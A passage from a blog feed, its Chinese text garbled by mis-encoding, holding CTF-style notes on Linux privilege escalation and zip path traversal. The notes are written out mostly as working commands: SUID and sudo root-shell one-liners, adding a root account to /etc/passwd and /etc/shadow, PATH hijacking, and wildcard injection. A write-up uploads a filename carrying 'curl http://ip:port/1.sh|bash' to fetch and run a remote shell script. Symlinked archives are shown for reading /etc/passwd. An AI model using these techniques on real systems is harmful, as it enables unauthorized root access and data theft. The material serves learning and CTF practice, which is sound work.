    <content type="html"><![CDATA[<h1 id="SUIDææƒ"><a href="#SUIDææƒ" class="headerlink" title="SUIDææƒ"></a>SUIDææƒ</h1><p>SUIDæ˜¯ä¸€ç§ç‰¹æ®Šæƒé™ï¼Œè®¾ç½®äº†suidçš„ç¨‹åºæ–‡ä»¶ï¼Œåœ¨ç”¨æˆ·æ‰§è¡Œè¯¥ç¨‹åºæ—¶ï¼Œç”¨æˆ·çš„æƒé™æ˜¯è¯¥ç¨‹åºæ–‡ä»¶å±ä¸»çš„æƒé™ï¼Œä¾‹å¦‚ç¨‹åºæ–‡ä»¶çš„å±ä¸»æ˜¯rootï¼Œé‚£ä¹ˆæ‰§è¡Œè¯¥ç¨‹åºçš„ç”¨æˆ·å°±å°†æš‚æ—¶è·å¾—rootè´¦æˆ·çš„æƒé™ã€‚sgidä¸suidç±»ä¼¼ï¼Œåªæ˜¯æ‰§è¡Œç¨‹åºæ—¶è·å¾—çš„æ˜¯æ–‡ä»¶å±ç»„çš„æƒé™ã€‚passwdè¿™ä¸ªå‘½ä»¤ç¨‹åºçš„æƒé™è®¾ç½®ï¼Œå®ƒå°±æ˜¯è®¾ç½®äº†suidæƒé™çš„<br><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215203606988.png" alt="image-20250215203606988"></p><p>æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li><p>åªæœ‰å¯ä»¥æ‰§è¡Œçš„äºŒè¿›åˆ¶ç¨‹åºæ–‡ä»¶æ‰èƒ½è®¾å®šSUIDæƒé™,éäºŒè¿›åˆ¶æ–‡ä»¶è®¾ç½®SUIDæƒé™æ²¡ä»»ä½•æ„ä¹‰.</p></li><li><p>å‘½ä»¤æ‰§è¡Œè€…è¦å¯¹è¯¥ç¨‹åºæ–‡ä»¶æ‹¥æœ‰æ‰§è¡Œ(x)æƒé™.</p></li><li><p>å‘½ä»¤æ‰§è¡Œè€…åœ¨æ‰§è¡Œè¯¥ç¨‹åºæ—¶è·å¾—è¯¥ç¨‹åºæ–‡ä»¶å±ä¸»çš„èº«ä»½.ï¼ˆåˆ©ç”¨ç‚¹ï¼‰</p></li><li><p>SUIDæƒé™åªåœ¨è¯¥ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­æœ‰æ•ˆ,ä¹Ÿå°±æ˜¯è¯´èº«ä»½æ”¹å˜åªåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­æœ‰æ•ˆ</p></li></ul><h2 id="å¦‚ä½•è®¾ç½®SUID"><a href="#å¦‚ä½•è®¾ç½®SUID" class="headerlink" title="å¦‚ä½•è®¾ç½®SUID"></a>å¦‚ä½•è®¾ç½®SUID</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> u+s filename è®¾ç½®SUIDä½<br><span class="hljs-built_in">chmod</span> u-s filename å»æ‰SUIDè®¾ç½®<br></code></pre></td></tr></table></figure><h2 id="å¸¸è§çš„å¯ä»¥ç”¨æ¥ææƒçš„å‘½ä»¤"><a href="#å¸¸è§çš„å¯ä»¥ç”¨æ¥ææƒçš„å‘½ä»¤" class="headerlink" title="å¸¸è§çš„å¯ä»¥ç”¨æ¥ææƒçš„å‘½ä»¤"></a>å¸¸è§çš„å¯ä»¥ç”¨æ¥ææƒçš„å‘½ä»¤</h2><p>å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap<br>vim<br>find<br>bash<br>more<br>less<br>nano<br><span class="hljs-built_in">cp</span><br>awk<br><span class="hljs-built_in">mv</span><br></code></pre></td></tr></table></figure><h2 id="æŸ¥æ‰¾SUIDæƒé™"><a href="#æŸ¥æ‰¾SUIDæƒé™" class="headerlink" title="æŸ¥æ‰¾SUIDæƒé™"></a>æŸ¥æ‰¾SUIDæƒé™</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> &#123;&#125; \; 2&gt;/dev/null<br></code></pre></td></tr></table></figure><h2 id="findææƒ"><a href="#findææƒ" class="headerlink" title="findææƒ"></a>findææƒ</h2><p>findæ¯”è¾ƒå¸¸ç”¨,findç”¨æ¥åœ¨ç³»ç»Ÿä¸­æŸ¥æ‰¾æ–‡ä»¶ã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿæœ‰æ‰§è¡Œå‘½ä»¤çš„èƒ½åŠ›ã€‚ å› æ­¤ï¼Œå¦‚æœé…ç½®ä¸ºä½¿ç”¨<br>SUIDæƒé™è¿è¡Œï¼Œåˆ™å¯ä»¥é€šè¿‡findæ‰§è¡Œçš„å‘½ä»¤éƒ½å°†ä»¥rootèº«ä»½å»è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> anyfile <span class="hljs-comment">#å¿…é¡»è¦æœ‰è¿™ä¸ªæ–‡ä»¶</span><br>find anyfile -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \; <span class="hljs-comment">#æ‰§è¡Œä»»æ„å‘½ä»¤</span><br>find . -<span class="hljs-built_in">exec</span> /bin/sh -p  <span class="hljs-comment">#é€šè¿‡-på¼€å¯rootæƒé™shell</span><br></code></pre></td></tr></table></figure><h2 id="bashææƒ"><a href="#bashææƒ" class="headerlink" title="bashææƒ"></a>bashææƒ</h2><p>bashå‘½ä»¤æ˜¯ç”¨æ¥æ‰“å¼€ä¸€ä¸ªshellã€‚åŒæ—¶å®ƒä¹Ÿæœ‰æ‰§è¡Œå‘½ä»¤çš„èƒ½åŠ›ã€‚ å› æ­¤ï¼Œå¦‚æœé…ç½®ä¸ºä½¿ç”¨SUIDæƒé™è¿è¡Œï¼Œåˆ™å¯ä»¥é€šè¿‡bashæ‰§è¡Œçš„å‘½ä»¤éƒ½å°†ä»¥rootèº«ä»½å»è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -p<br></code></pre></td></tr></table></figure><p>å¼€å¯rootç»ˆç«¯</p><h2 id="vimææƒ"><a href="#vimææƒ" class="headerlink" title="vimææƒ"></a>vimææƒ</h2><p>åˆ©ç”¨vimææƒçš„æ€è·¯æ˜¯ä¿®æ”¹&#x2F;etc&#x2F;passwdæ–‡ä»¶å’Œ&#x2F;etc&#x2F;shadowï¼Œä¸ºè‡ªå·±æ·»åŠ ä¸€ä¸ªæœ‰rootæƒé™çš„ç”¨æˆ·</p><p>1.åˆ©ç”¨vimæ·»åŠ è´¦å·</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/passwd æ·»åŠ ç‰¹æƒç”¨æˆ·<br>æ·»åŠ ï¼šhacker:x:0:0::/home/hacker:/bin/bash<br>vim /etc/shadow æ·»åŠ ç‰¹æƒç”¨æˆ·<br>hacker:$1$salt<span class="hljs-variable">$638tR8bROOvPnPklDQ9Vf</span>/:19103:0:99999:7::: å¯†ç æ˜¯123456<br>su hacker<br></code></pre></td></tr></table></figure></blockquote><p>2.åˆ©ç”¨vimæ‰“å¼€äº¤äº’shell</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim -c <span class="hljs-string">&#x27;:py import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡-cè¿è¡Œä»£ç ï¼Œç”¨è¿‡pythonæ‰“å¼€rootç»ˆç«¯</p></blockquote><h2 id="python-python3ææƒ"><a href="#python-python3ææƒ" class="headerlink" title="python&#x2F;python3ææƒ"></a>python&#x2F;python3ææƒ</h2><p>é€šè¿‡<code>-c</code>æ‰§è¡Œå‘½ä»¤æ‰“å¼€ç»ˆç«¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="è®¡åˆ’ä»»åŠ¡ææƒ"><a href="#è®¡åˆ’ä»»åŠ¡ææƒ" class="headerlink" title="è®¡åˆ’ä»»åŠ¡ææƒ"></a>è®¡åˆ’ä»»åŠ¡ææƒ</h1><p>linuxè®¡åˆ’ä»»åŠ¡ææƒæ˜¯å› ä¸ºæƒé™é…ç½®ä¸å½“ï¼Œè®¡åˆ’ä»»åŠ¡ä»¥rootæƒé™è¿è¡Œï¼Œä½æƒé™çš„ç”¨æˆ·å¯ä»¥ä¿®æ”¹è®¡åˆ’ä»»åŠ¡çš„æ–‡ä»¶ï¼Œä»è€Œè¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œå¯¼è‡´ææƒï¼ŒLinuxè®¡åˆ’ä»»åŠ¡å‘½ä»¤å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">crontab -e ç¼–è¾‘è®¡åˆ’ä»»åŠ¡<br>crontab -l æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡<br>crontab -r åˆ é™¤ç›®å‰çš„crontab<br></code></pre></td></tr></table></figure><p>è®¡åˆ’ä»»åŠ¡çš„æ–‡ä»¶å¤¹åœ¨<code> /etc/cron*</code>ä¸‹</p><p>æ¡ä»¶ï¼š</p><ul><li>è®¡åˆ’ä»»åŠ¡çš„æƒé™æ˜¯777æˆ–è€…æ˜¯suid</li></ul><p>ææƒæ–¹æ³•ï¼š</p><ul><li>å…ˆæŸ¥çœ‹æ˜¯ä¸æ˜¯å­˜åœ¨é«˜æƒé™çš„è®¡åˆ’ä»»åŠ¡</li><li>è¿½åŠ å‘½ä»¤æ”¾å…¥æ–‡ä»¶å†…</li><li>å¤–å¸¦å‡ºæ‰§è¡Œç»“æœ åå¼¹shell å†™æ–‡ä»¶ç­‰</li></ul><h1 id="ç¯å¢ƒå˜é‡åŠ«æŒææƒ"><a href="#ç¯å¢ƒå˜é‡åŠ«æŒææƒ" class="headerlink" title="ç¯å¢ƒå˜é‡åŠ«æŒææƒ"></a>ç¯å¢ƒå˜é‡åŠ«æŒææƒ</h1><p>PATHæ˜¯Linuxå’Œç±»Unixæ“ä½œç³»ç»Ÿä¸­çš„ç¯å¢ƒå˜é‡ï¼Œå½“æˆ‘ä»¬æ‰§è¡Œä¸€ä¸ªå‘½ä»¤çš„æ—¶å€™shellä¼šå…ˆæ£€æŸ¥å‘½ä»¤æ˜¯å¦æ˜¯ç³»ç»Ÿå†…éƒ¨å‘½ä»¤ï¼Œå¦‚æœä¸æ˜¯åˆ™ä¼šå†å»æ£€æŸ¥æ­¤å‘½ä»¤æ˜¯å¦æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œshellä¼šè¯•ç€ä»PATHä¸­é€æ­¥æŸ¥æ‰¾å‘½ä»¤ï¼Œæˆ‘ä»¬å°±å¢åŠ ç¯å¢ƒå˜é‡è®©shellå…ˆæ‰¾åˆ°æˆ‘ä»¬çš„æ–‡ä»¶</p><p>æ¡ä»¶ï¼š</p><ul><li>æ–‡ä»¶æ—¶suidæƒé™ï¼Œå‘½ä»¤ä¸æ˜¯ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</li></ul><p>å‡å¦‚æ–‡ä»¶å†…å®¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>setuid(<span class="hljs-number">0</span>);<br>setgid(<span class="hljs-number">0</span>);<br>system(<span class="hljs-string">&quot;cat /etc/shadow&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ˜¯ä½¿ç”¨çš„æ˜¯<code>cat</code>è€Œä¸æ˜¯<code>/bin/cat</code>å¦‚æœè¿™ä¸ªæ–‡ä»¶çš„æƒé™æ˜¯suidé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç¯å¢ƒå˜é‡åŠ«æŒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/bash\n/bin/bash&quot;</span> &gt; /tmp/cat <span class="hljs-comment">#å†™å…¥æˆ‘ä»¬çš„å‘½ä»¤</span><br><span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">cat</span>   <span class="hljs-comment">#ç»™æ‰§è¡Œæƒé™</span><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span> <span class="hljs-comment">#å¢åŠ ç¯å¢ƒå˜é‡</span><br>æ‰§è¡ŒåŸå‘½ä»¤<br><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°æƒé™</p><h1 id="SUDOææƒ"><a href="#SUDOææƒ" class="headerlink" title="SUDOææƒ"></a>SUDOææƒ</h1><p><a href="https://www.huangmj.com/17116743651246.html#12-sudo-dd">Linuxææƒä¹‹Sudo 70ç§ææƒæ–¹æ³•</a></p><p>sudoæ˜¯linuxç³»ç»Ÿç®¡ç†æŒ‡ä»¤ï¼Œæ˜¯å…è®¸ç³»ç»Ÿç®¡ç†å‘˜è®©æ™®é€šç”¨æˆ·æ‰§è¡Œä¸€äº›æˆ–è€…å…¨éƒ¨çš„rootå‘½ä»¤çš„ä¸€ä¸ªå·¥å…·ï¼Œå¦‚rebootï¼Œsuç­‰ç­‰ã€‚è¿™æ ·ä¸ä»…å‡å°‘äº†rootç”¨æˆ·çš„ç™»å½• å’Œç®¡ç†æ—¶é—´ï¼ŒåŒæ ·ä¹Ÿæé«˜äº†å®‰å…¨æ€§ã€‚sudoä¸æ˜¯å¯¹shellçš„ä¸€ä¸ªä»£æ›¿ï¼Œå®ƒæ˜¯é¢å‘æ¯ä¸ªå‘½ä»¤çš„ã€‚</p><p>ä½†æ˜¯æƒ³è·å–å“ªäº›å‘½ä»¤è®¾ç½®äº†æ— å¯†ç sudoï¼Œè¿˜æ˜¯éœ€è¦æŸ¥çœ‹ cat &#x2F;etc&#x2F;sudoers æ–‡ä»¶æˆ–è€… sudo -l å‘½ä»¤ï¼Œè€Œè¿™ä¸¤æ¡å‘½ä»¤éƒ½éœ€è¦ä¸€å®šæƒé™æˆ–è€…çŸ¥é“å½“å‰ç”¨æˆ·å¯†ç  </p><p>ææƒçš„å‘½ä»¤å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">ä¸€æ¡å‘½ä»¤ææƒçš„<br><span class="hljs-built_in">sudo</span> vim -c <span class="hljs-string">&#x27;!sh&#x27;</span><br><span class="hljs-built_in">sudo</span> awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br><span class="hljs-built_in">sudo</span> xxd <span class="hljs-string">&quot;/etc/shadow&quot;</span> | xxd -r<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">env</span> /bin/sh<br><span class="hljs-built_in">sudo</span> perl -e <span class="hljs-string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br><span class="hljs-built_in">sudo</span> zip 2.zip 1.txt -T --unzip-command=<span class="hljs-string">&quot;sh -c /bin/sh&quot;</span><br><span class="hljs-built_in">sudo</span> sed -n <span class="hljs-string">&#x27;1e exec sh 1&gt;&amp;0&#x27;</span> /etc/passwd<br><span class="hljs-built_in">sudo</span> find /etc/passwd -<span class="hljs-built_in">exec</span> /bin/sh \;<br>ä¸¤æ¡å‘½ä»¤ææƒçš„<br><span class="hljs-built_in">sudo</span> git <span class="hljs-built_in">help</span> config<br>!/bin/sh<br><span class="hljs-built_in">sudo</span> ftp<br>!/bin/sh<br><span class="hljs-built_in">sudo</span> less /etc/hosts<br>!sh<br><span class="hljs-built_in">sudo</span> ed<br>!/bin/sh<br><span class="hljs-built_in">sudo</span> man man<br>!/bin/sh<br></code></pre></td></tr></table></figure><h1 id="é€šé…ç¬¦ææƒ"><a href="#é€šé…ç¬¦ææƒ" class="headerlink" title="é€šé…ç¬¦ææƒ"></a>é€šé…ç¬¦ææƒ</h1><p>é€šé…ç¬¦ï¼š</p><figure class="highlight do"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs do"><span class="hljs-comment">* ä»£è¡¨ä»»æ„æ•°é‡çš„å­—ç¬¦</span><br>? å­—ç¬¦ä»£è¡¨å•ä¸ªå­—ç¬¦<br>[] åŒ¹é…ä¸­æ‹¬å·ä¸­çš„ä»»æ„å•ä¸€å­—ç¬¦ å¯ä»¥ä½¿ç”¨è¿å­—ç¬¦-è¡¨ç¤ºèŒƒå›´ï¼Œæ¯”å¦‚[0-9]<br></code></pre></td></tr></table></figure><p>åŸç†ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;3&quot;</span> &gt; --<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><p>ç”Ÿæˆä¸€ä¸ª<code>--help</code>æ–‡ä»¶ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥<code>cat --help</code>ä¼šæ˜¾ç¤ºcatçš„å¸®åŠ©</p><p>ä½†æ˜¯æˆ‘ä»¬æ‰§è¡Œ<code>cat *</code>å°±ä¼šè¾“å‡ºâ€“help</p><p>ç”¨æ³•ï¼š</p><p>å¯¹äºé«˜æƒé™è®¡åˆ’ä»»åŠ¡å¦‚æœä½¿ç”¨é€šé…ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ ç‰¹æ®Šçš„æ–‡ä»¶åï¼Œæ‰“åˆ°ç”¨é«˜æƒé™æ‰§è¡Œå‘½ä»¤</p><p>ä¾‹é¢˜ï¼š</p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>è¿™ä¸ªé¢˜ç›®ï¼Œå‘œå‘œå‘œï¼Œåˆšè¿›å»å®Œå…¨ä¸çŸ¥é“è¦å¹²å˜›ï¼Œç¬¬ä¸€æ¬¡çœ‹æºç ä¹Ÿæ²¡ç¿»åˆ°æœ€ä¸‹é¢ï¼Œæµ…æµ…çš„ç¿»äº†ä¸€ä¸‹ï¼Œç¬¬äºŒå¤©å†çœ‹çš„æ—¶å€™æ‰å†æœ€ä¸‹é¢æ‰¾åˆ°</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d7d936edd931ff0b32322c3228fe769a.png" alt="d7d936edd931ff0b32322c3228fe769a"></p><p>æˆ‘ä»¬ç›´æ¥å†ä¸Šä¼ <code>?_[2025.happy.new.year=curl http;//ip:port/1.sh|bash</code>æˆåŠŸæ‹¿åˆ°shell</p><p>æŸ¥çœ‹æ ¹ç›®å½•å‘ç°æœ‰flagï¼Œä½†æ˜¯æƒé™ä¸å¤Ÿ</p><p>å°è¯•suidææƒä½†æ˜¯æ²¡æœ‰</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d720cfebd70d29e1289e1429f571c8cd.png" alt="d720cfebd70d29e1289e1429f571c8cd"></p><p>çœ‹ä¸€ä¸‹<code>ps -ef</code>çœ‹çœ‹æ‰§è¡Œäº†ä»€ä¹ˆ</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210235408861.png" alt="image-20250210235408861"></p><p>å‘å…ˆæ‰§è¡Œäº†<code>/start.sh</code>å’Œ<code>backup.sh</code></p><p>startæ²¡æœ‰æƒé™çœ‹ä¸äº†ï¼Œé‚£å°±çœ‹backup</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-keyword">while</span> :<br><span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">cp</span> -P * /var/www/html/backup/<br>    <span class="hljs-built_in">chmod</span> 755 -R /var/www/html/backup/<br>    <span class="hljs-built_in">sleep</span> 15s<br><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>å‘ç°ä»–ä¼šä¸€ç›´æ‰§è¡Œï¼Œåˆšå¼€å§‹çš„æ€è·¯æ˜¯ç¯å¢ƒå˜é‡åŠ«æŒsleepå‡½æ•°è®©ä»–æ‰§è¡Œ<code>cat /flag &gt; /var/www/html/backup/1</code></p><p>å†<code>export PATH=/tmp:$PATH</code>å†åˆ›å»ºä¸€ä¸ª<code>/tmp/sleep</code>ä¸º<code>cat /flag &gt; /var/www/html/backup/1</code>ç»™æƒé™</p><p>æˆ‘è‡ªå·±å°è¯•ä¼šæ‰§è¡Œ<code>/tem/sleep</code>ä½†ç”±äºæ²¡æœ‰æƒé™å°±æ˜¯ç©ºæ–‡ä»¶ï¼Œä½†æ˜¯backp.shä¸ä¼šæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><p>åæ¥å‘ç°<code>backup.sh</code>ä½¿ç”¨äº†é€šé…ç¬¦<code>*</code>é‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥å†æ–‡ä»¶åä¸Šä¸‹æ‰‹</p><p>åˆšåˆšå¥½cpæœ‰ä¸€ä¸ªå‚æ•°<code>-H</code>å¯ä»¥è®©è½¯é“¾æ¥ä¹Ÿè¢«å¤åˆ¶</p><p>é‚£ä¹ˆå°±å¯ä»¥å®ç°</p><p>payloadï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;-H&quot;</span>  ä¸æ˜¯å¸¸è§„æ–‡ä»¶åä¸å¯ä»¥ç”¨<span class="hljs-built_in">touch</span><br><span class="hljs-built_in">ln</span> -s /flag 1<br></code></pre></td></tr></table></figure><p>ç„¶åç­‰ä¸€ä¼šå‘ç°<code>/backup</code>æ–‡ä»¶å¤¹ä¸­æœ‰1</p><p>å†è¯»å–1æ‹¿åˆ°flag</p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linuxææƒ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zipæ–‡ä»¶é€ƒé€¸æ¼æ´</title>
    <link href="/2025/02/15/zip%E6%96%87%E4%BB%B6%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/02/15/zip%E6%96%87%E4%BB%B6%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="zipæ–‡ä»¶ç›®å½•ç©¿è¶Š"><a href="#zipæ–‡ä»¶ç›®å½•ç©¿è¶Š" class="headerlink" title="zipæ–‡ä»¶ç›®å½•ç©¿è¶Š"></a>zipæ–‡ä»¶ç›®å½•ç©¿è¶Š</h1><p>ç›®å½•ç»“æ„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”œâ”€â”€ /app                               <br>â”‚   â”œâ”€â”€ /app.py                         <br>â”‚   â”œâ”€â”€ /uploads                       <br>â”‚   â”œâ”€â”€ /templates                   <br>â”‚   â””â”€â”€ /.config <br>â”‚â”€â”€ home<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶çš„ç›®å½•åœ¨<code>uploads</code>ï¼Œæˆ‘ä»¬æƒ³è¦è¦†ç›–app.pyï¼Œé‚£è§£é‡Š<code>../app.py</code></p><p>æˆ‘ä»¬æŠŠè¦è¦†ç›–çš„æ–‡ä»¶æ‰“åŒ…æˆå‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…åå­—å†™æˆ<code>..1app.py</code></p><p>ç„¶åæŠŠæ–‡ä»¶ç”¨<code>notepad++</code>æ‰“å¼€æŠŠ<code>1</code>æ”¹æˆ<code>/</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215202207812.png" alt="image-20250215202207812"></p><p>æœ‰ä¸¤å¤„éƒ½è¦æ”¹</p><h1 id="è½¯é“¾æ¥æ‰“åŒ…"><a href="#è½¯é“¾æ¥æ‰“åŒ…" class="headerlink" title="è½¯é“¾æ¥æ‰“åŒ…"></a>è½¯é“¾æ¥æ‰“åŒ…</h1><p>æ–‡ä»¶è½¯é“¾æ¥åˆ°&#x2F;etc&#x2F;passwdç­‰æ–‡ä»¶ï¼Œè¾¾åˆ°ä»»æ„æ–‡ä»¶è¯»å–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /etc/passwd ./a   <span class="hljs-comment">#æ–‡ä»¶/etc/pawwsdè½¯é“¾æ¥åˆ°a</span><br>zip --symlinks -r 1.zip ./a  <span class="hljs-comment">#å°†aæ–‡ä»¶å‹ç¼©ä¸º1.zip</span><br></code></pre></td></tr></table></figure><p>è§£é‡Šï¼š</p><blockquote><h3 id="symlinksï¼š"><a href="#symlinksï¼š" class="headerlink" title="--symlinksï¼š"></a><code>--symlinks</code>ï¼š</h3><p>è¿™ä¸ªé€‰é¡¹å‘Šè¯‰ <code>zip</code> åœ¨å‹ç¼©ç¬¦å·é“¾æ¥ï¼ˆsymlinkï¼‰æ—¶ï¼Œè¦ä¿ç•™å…¶ç¬¦å·é“¾æ¥ç‰¹æ€§ï¼Œè€Œä¸æ˜¯å°†å®ƒä»¬è½¬æ¢æˆé“¾æ¥ç›®æ ‡æ–‡ä»¶çš„å®é™…å†…å®¹</p></blockquote><p>è¿™ä¸ªä»…é€‚åˆå“ªäº›æ–‡ä»¶å±•ç¤ºç•Œé¢é€‚ç”¨</p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>zipæ–‡ä»¶é€ƒé€¸</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpä¼ªéšæœºæ•°</title>
    <link href="/2025/02/15/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
    <url>/2025/02/15/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
    
